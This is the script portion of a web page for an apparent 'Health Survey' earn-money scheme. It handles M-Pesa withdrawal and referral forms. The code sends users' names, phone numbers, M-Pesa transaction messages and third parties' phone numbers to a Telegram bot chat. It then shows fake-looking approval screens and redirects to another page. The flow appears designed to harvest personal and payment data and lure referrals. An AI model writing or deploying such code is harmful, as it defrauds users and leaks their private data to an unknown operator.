    } else {
        duplicateAlert.style.display = "none";
        submitBtn.disabled = false;
        submitBtn.style.opacity = "1";
        submitBtn.style.cursor = "pointer";
    }
});

// Submit Withdrawal Button - FIXED with better error handling
document.getElementById("submitWithdrawalBtn").onclick = async function() {
    const username = document.getElementById("username").value.trim();
    const phoneNumber = document.getElementById("phoneNumber").value.trim();
    const withdrawAmount = parseInt(document.getElementById("withdrawAmount").value);
    const comment = document.getElementById("commentBox").value.trim();
    
    if (!username || !phoneNumber || !withdrawAmount || !comment) {
        alert("Please fill all fields.");
        return;
    }
    
    if (withdrawAmount > 65) {
        alert("Withdrawal amount cannot exceed Ksh 65.");
        return;
    }
    
    if (withdrawAmount > balance) {
        alert("Insufficient balance.");
        return;
    }
    
    if (submittedMessages.has(comment)) {
        alert("‚ùå This MPesa message has already been submitted. Please use a different message.");
        return;
    }
    
    const modal = document.getElementById("verificationModal");
    const modalTitle = document.getElementById("modalTitle");
    const modalSpinner = document.getElementById("modalSpinner");
    const modalContent = document.getElementById("modalContent");
    const modalMessage = document.getElementById("modalMessage");
    const whatsappSupport = document.getElementById("whatsappSupport");
    const whatsappLink = document.getElementById("whatsappLink");
    
    whatsappLink.href = `https://wa.me/+231777863342?text=Hello%2C%20I%20need%20help%20with%20my%20withdrawal%20of%20Ksh%20${withdrawAmount}%20-%20${username}%20${phoneNumber}`;
    
    modal.style.display = "flex";
    modalTitle.innerText = "Verification in Progress";
    modalSpinner.style.display = "block";
    modalContent.innerHTML = "";
    modalMessage.innerText = "Sending to admin for verification...";
    whatsappSupport.style.display = "none";
    
    try {
        console.log("Sending withdrawal request to Telegram...");
        
        // Send to Telegram
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { 
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: `üí∞ WITHDRAWAL REQUEST\n\nüë§ Name: ${username}\nüì± Phone: ${phoneNumber}\nüíµ Amount: Ksh ${withdrawAmount}\nüìù MPesa Message: ${comment}\nüí∞ Balance: Ksh ${balance}\nüìÖ Date: ${new Date().toLocaleString()}`,
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: "‚úÖ APPROVE PAYMENT", callback_data: `approve_${username}_${withdrawAmount}` },
                            { text: "‚ùå REJECT PAYMENT", callback_data: `reject_${username}` }
                        ]
                    ]
                }
            })
        });
        
        const result = await response.json();
        console.log("Telegram response:", result);
        
        if (result.ok) {
            // Save locally only after successful Telegram send
            submittedMessages.add(comment);
            
            if (db) {
                const tx = db.transaction("messages", "readwrite");
                const store = tx.objectStore("messages");
                store.put({ message: comment });
            }
            
            submissionCount++;
            saveProgress();
            
            modalMessage.innerText = "‚úÖ Sent to admin! Waiting for verification...";
            monitorApproval(username, withdrawAmount);
        } else {
            throw new Error(result.description || "Failed to send message");
        }
        
    } catch (error) {
        console.error("Telegram error:", error);
        modalSpinner.style.display = "none";
        modalContent.innerHTML = `<div class="cross-mark"></div>`;
        modalTitle.innerText = "Error ‚ùå";
        modalMessage.innerText = "Failed to send request. Please check your internet and try again.";
        whatsappSupport.style.display = "flex";
    }
};

function monitorApproval(username, withdrawAmount) {
    const modal = document.getElementById("verificationModal");
    const modalTitle = document.getElementById("modalTitle");
    const modalSpinner = document.getElementById("modalSpinner");
    const modalContent = document.getElementById("modalContent");
    const modalMessage = document.getElementById("modalMessage");
    const whatsappSupport = document.getElementById("whatsappSupport");
    
    let checkCount = 0;
    const maxChecks = 60; // Check for 3 minutes
    
    const interval = setInterval(async () => {
        checkCount++;
        
        try {
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=10`);
            const data = await response.json();
            
            if (data.result && data.result.length > 0) {
                for (const update of data.result) {
                    if (update.update_id > lastUpdateId) {
                        lastUpdateId = update.update_id;
                    }
                    
                    if (update.callback_query) {
                        const callbackData = update.callback_query.data;
                        
                        if (callbackData.startsWith(`approve_${username}`)) {
                            clearInterval(interval);
                            
                            modalSpinner.style.display = "none";
                            modalTitle.innerText = "‚úÖ PAYMENT APPROVED!";
                            modalContent.innerHTML = `<svg class="checkmark" viewBox="0 0 52 52">
                                <circle class="checkmark-circle" cx="26" cy="26" r="25" fill="none"/>
                                <path class="checkmark-check" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8"/>
                            </svg>`;
                            modalMessage.innerText = "Payment approved! Redirecting...";
                            
                            balance = Math.max(5, balance - withdrawAmount);
                            updateBalance();
                            saveProgress();
                            
                            setTimeout(() => {
                                modal.style.display = "none";
                                window.location.href = "https://summitsolutions28.github.io/Well8372/S1999.html";
                            }, 3000);
                            
                            return;
                        }
                        
                        if (callbackData === `reject_${username}`) {
                            clearInterval(interval);
                            
                            modalSpinner.style.display = "none";
                            modalTitle.innerText = "‚ùå PAYMENT REJECTED";
                            modalContent.innerHTML = `<div class="cross-mark"></div>`;
                            modalMessage.innerText = "Payment rejected. Please check your MPesa message.";
                            whatsappSupport.style.display = "flex";
                            
                            setTimeout(() => {
                                modal.style.display = "none";
                            }, 5000);
                            
                            return;
                        }
                    }
                }
            }
            
            modalMessage.innerText = `Waiting for admin... (${Math.floor(checkCount * 3)}s)`;
            
            if (checkCount >= maxChecks) {
                clearInterval(interval);
                modalSpinner.style.display = "none";
                modalContent.innerHTML = `<div class="cross-mark"></div>`;
                modalTitle.innerText = "‚è∞ TIMEOUT";
                modalMessage.innerText = "Verification timeout. Please contact support.";
                whatsappSupport.style.display = "flex";
            }
            
        } catch (error) {
            console.error("Monitor error:", error);
        }
    }, 3000);
}

// Referral Functions
function toggleReferralForm() {
    const form = document.getElementById("referralSubmissionForm");
    form.style.display = form.style.display === "none" || form.style.display === "" ? "block" : "none";
}

function copyReferralLink() {
    const linkInput = document.getElementById("referralLink");
    linkInput.select();
    linkInput.setSelectionRange(0, 99999);
    document.execCommand("copy");
    
    const copiedMessage = document.getElementById("copiedMessage");
    copiedMessage.style.display = "block";
    
    setTimeout(() => {
        copiedMessage.style.display = "none";
    }, 2000);
}

function shareViaWhatsApp() {
    const link = document.getElementById("referralLink").value;
    const text = encodeURIComponent(`Join me on Health Survey and earn money! Use my referral link: ${link}`);
    window.open(`https://wa.me/?text=${text}`, '_blank');
}

function shareViaTwitter() {
    const link = document.getElementById("referralLink").value;
    const text = encodeURIComponent(`Join me on Health Survey and earn money! Use my referral link: ${link}`);
    window.open(`https://twitter.com/intent/tweet?text=${text}`, '_blank');
}

function shareViaFacebook() {
    const link = document.getElementById("referralLink").value;
    window.open(`https://www.facebook.com/sharer/sharer.php?u=${encodeURIComponent(link)}`, '_blank');
}

function shareViaTelegram() {
    const link = document.getElementById("referralLink").value;
    const text = encodeURIComponent(`Join me on Health Survey and earn money! Use my referral link: ${link}`);
    window.open(`https://t.me/share/url?url=${encodeURIComponent(link)}&text=${text}`, '_blank');
}

// Submit Referral - FIXED with better error handling
async function submitReferral() {
    const referredName = document.getElementById("referredName").value.trim();
    const referredPhone = document.getElementById("referredPhone").value.trim();
    const currentUsername = document.getElementById("username").value.trim() || "Not Provided";
    const currentPhone = document.getElementById("phoneNumber").value.trim() || "Not Provided";
    
    if (!referredName || !referredPhone) {
        alert("Please fill in both fields");
        return;
    }
    
    const modal = document.getElementById("referralVerificationModal");
    const modalTitle = document.getElementById("referralModalTitle");
    const modalSpinner = document.getElementById("referralModalSpinner");
    const modalContent = document.getElementById("referralModalContent");
    const modalMessage = document.getElementById("referralModalMessage");
    const whatsappSupport = document.getElementById("referralWhatsappSupport");
    const whatsappLink = document.getElementById("referralWhatsappLink");
    
    whatsappLink.href = `https://wa.me/+231777863342?text=Hello%2C%20I%20need%20help%20with%20my%20referral%20verification%20for%20${referredName}`;
    
    modal.style.display = "flex";
    modalTitle.innerText = "Referral Verification";
    modalSpinner.style.display = "block";
    modalContent.innerHTML = "";
    modalMessage.innerText = "Sending referral to admin...";
    whatsappSupport.style.display = "none";
    
    try {
        console.log("Sending referral to Telegram...");
        
        // Send to Telegram
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { 
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: `üë• NEW REFERRAL SUBMISSION\n\nüë§ Referrer: ${currentUsername}\nüì± Referrer Phone: ${currentPhone}\n\nüë• Referred Person: ${referredName}\nüì± Referred Phone: ${referredPhone}\n\nüí∞ Reward: Ksh 20 upon approval\nüïê Submitted: ${new Date().toLocaleString()}`,
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: "‚úÖ APPROVE REFERRAL (+Ksh 20)", callback_data: `approve_ref_${referredPhone}_20` },
                            { text: "‚ùå REJECT REFERRAL", callback_data: `reject_ref_${referredPhone}` }
                        ]
                    ]
                }
            })
        });
        
        const result = await response.json();
        console.log("Telegram referral response:", result);
        
        if (result.ok) {
            // Save to database
            const referralData = {
                referrerName: currentUsername,
                referrerPhone: currentPhone,
                referredName: referredName,
                referredPhone: referredPhone,
                status: 'pending',
                timestamp: new Date().toISOString(),
                messageId: result.result.message_id
            };
            
            if (db) {
                const tx = db.transaction("referrals", "readwrite");
                const store = tx.objectStore("referrals");
                store.add(referralData);
            }
            
            pendingReferrals.push(referralData);
            
            modalMessage.innerText = "‚úÖ Sent to admin! Waiting for verification...";
            monitorReferralApproval(referredPhone, referredName);
        } else {
            throw new Error(result.description || "Failed to send referral");
        }
        
    } catch (error) {
        console.error("Telegram error:", error);
        modalSpinner.style.display = "none";
        modalContent.innerHTML = `<div class="cross-mark"></div>`;
        modalTitle.innerText = "Error ‚ùå";
        modalMessage.innerText = "Failed to send referral. Please check your internet.";
        whatsappSupport.style.display = "flex";
    }
}

function monitorReferralApproval(referredPhone, referredName) {
    const modal = document.getElementById("referralVerificationModal");
    const modalTitle = document.getElementById("referralModalTitle");
    const modalSpinner = document.getElementById("referralModalSpinner");
    const modalContent = document.getElementById("referralModalContent");
    const modalMessage = document.getElementById("referralModalMessage");
    const whatsappSupport = document.getElementById("referralWhatsappSupport");
    
    let checkCount = 0;
    const maxChecks = 60; // Check for 3 minutes
    
    const interval = setInterval(async () => {
        checkCount++;
        
        try {
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=10`);
            const data = await response.json();
            
            if (data.result && data.result.length > 0) {
                for (const update of data.result) {
                    if (update.update_id > lastUpdateId) {
                        lastUpdateId = update.update_id;
                    }
                    
                    if (update.callback_query) {
                        const callbackData = update.callback_query.data;
                        
                        if (callbackData.startsWith(`approve_ref_${referredPhone}`)) {
                            clearInterval(interval);
                            
                            // Add Ksh 20 to balance
                            balance += 20;
                            updateBalance();
                            saveProgress();
                            
                            modalSpinner.style.display = "none";
                            modalTitle.innerText = "‚úÖ REFERRAL APPROVED!";
                            modalContent.innerHTML = `<svg class="checkmark" viewBox="0 0 52 52">
                                <circle class="checkmark-circle" cx="26" cy="26" r="25" fill="none"/>
                                <path class="checkmark-check" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8"/>
                            </svg>`;
                            modalMessage.innerText = `Congratulations! Ksh 20 added to your balance!`;
                            
                            const statusDiv = document.getElementById("referralStatus");
                            statusDiv.className = "referral-status approved";
                            statusDiv.innerHTML = "‚úÖ Referral Verified! Ksh 20 added.";
                            statusDiv.style.display = "block";
                            
                            document.getElementById("referredName").value = "";
                            document.getElementById("referredPhone").value = "";
                            
                            setTimeout(() => {
                                modal.style.display = "none";
                            }, 3000);
                            
                            return;
                        }
                        
                        if (callbackData === `reject_ref_${referredPhone}`) {
                            clearInterval(interval);
                            
                            modalSpinner.style.display = "none";
                            modalTitle.innerText = "‚ùå REFERRAL REJECTED";
                            modalContent.innerHTML = `<div class="cross-mark"></div>`;
                            modalMessage.innerText = "Referral could not be verified.";
                            
                            const statusDiv = document.getElementById("referralStatus");
                            statusDiv.className = "referral-status rejected";
                            statusDiv.innerHTML = "‚ùå Referral Not Verified";
                            statusDiv.style.display = "block";
                            
                            setTimeout(() => {
                                modal.style
                                .display = "none";
                            }, 3000);
                            
                            return;
                        }
                    }
                }
            }
            
            modalMessage.innerText = `Waiting for admin... (${Math.floor(checkCount * 3)}s)`;
            
            if (checkCount >= maxChecks) {
                clearInterval(interval);
                modalSpinner.style.display = "none";
                modalContent.innerHTML = `<div class="cross-mark"></div>`;
                modalTitle.innerText = "‚è∞ TIMEOUT";
                modalMessage.innerText = "Verification timeout. Contact support.";
                whatsappSupport.style.display = "flex";
                
                const statusDiv = document.getElementById("referralStatus");
                statusDiv.className = "referral-status pending";
                statusDiv.innerHTML = "‚è≥ Pending verification";
                statusDiv.style.display = "block";
            }
            
        } catch (error) {
            console.error("Monitor error:", error);
        }
    }, 3000);
}

// Initialize
loadProgress();
</script>
</body>
</html>